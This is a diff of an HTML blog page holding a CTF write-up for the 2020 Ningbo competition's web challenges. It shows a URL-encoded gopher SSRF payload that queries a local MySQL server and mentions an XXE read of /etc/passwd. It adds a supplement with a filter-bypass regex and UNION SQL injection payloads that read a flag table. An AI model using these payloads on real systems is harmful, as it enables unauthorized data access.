@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -444,6 +444,11 @@ height:50vh;
 <p><code>gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2518%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2573%2573%2572%2566%252e%2566%256c%2561%2567%2501%2500%2500%2500%2501</code></p>
 <p><img src="http://pic.c1imber.top/blog/20200705/IY43I2QbguNd.png?imageslim" alt="mark"></p>
 <h3 id="easy-xxe"><a href="#easy-xxe" class="headerlink" title="easy_xxe"></a>easy_xxe</h3><p>可以读取到<code>/etc/passwd</code>文件，但是找不到flag位置，比赛结束也没做出来，等writeup学习吧，哭</p>
+<h3 id="2020-7-9补充"><a href="#2020-7-9补充" class="headerlink" title="2020.7.9补充"></a>2020.7.9补充</h3><p>看了其他师傅们easy_sql这道题的writeup，发现可以直接从index.php.bak当中获取源码从而得到过滤规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(preg_match(&quot;/\d.+?\D.+/is&quot;,$id)</div></pre></td></tr></table></figure>
+<p>所以非常好绕，给出两个从其他师傅博客看到的writeup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ord(&apos;a&apos;)-ord(&apos;b&apos;) union select group_ concat(flag) from bankdb.flag</div><div class="line"></div><div class="line">now() union select group_ concat(flag) from bankdb.flag</div></pre></td></tr></table></figure>
+<p>当时写这道题时自己绝对是脑抽了，，，，，，</p>
 
     </article>
     <!-- license  -->
@@ -452,7 +457,7 @@ height:50vh;
             <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
             <p>原文链接：<a href="https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/">https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/</a>
             <p>发表日期：<a href="https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/">May 25th 2020, 3:34:45 pm</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/">July 9th 2020, 2:44:29 pm</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/">July 9th 2020, 3:11:53 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -580,7 +585,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#序"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web签到"><span class="toc-number">2.</span> <span class="toc-text">web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-sql"><span class="toc-number">3.</span> <span class="toc-text">easy_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-ssrf"><span class="toc-number">4.</span> <span class="toc-text">easy_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-xxe"><span class="toc-number">5.</span> <span class="toc-text">easy_xxe</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#序"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web签到"><span class="toc-number">2.</span> <span class="toc-text">web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-sql"><span class="toc-number">3.</span> <span class="toc-text">easy_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-ssrf"><span class="toc-number">4.</span> <span class="toc-text">easy_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-xxe"><span class="toc-number">5.</span> <span class="toc-text">easy_xxe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2020-7-9补充"><span class="toc-number">6.</span> <span class="toc-text">2020.7.9补充</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
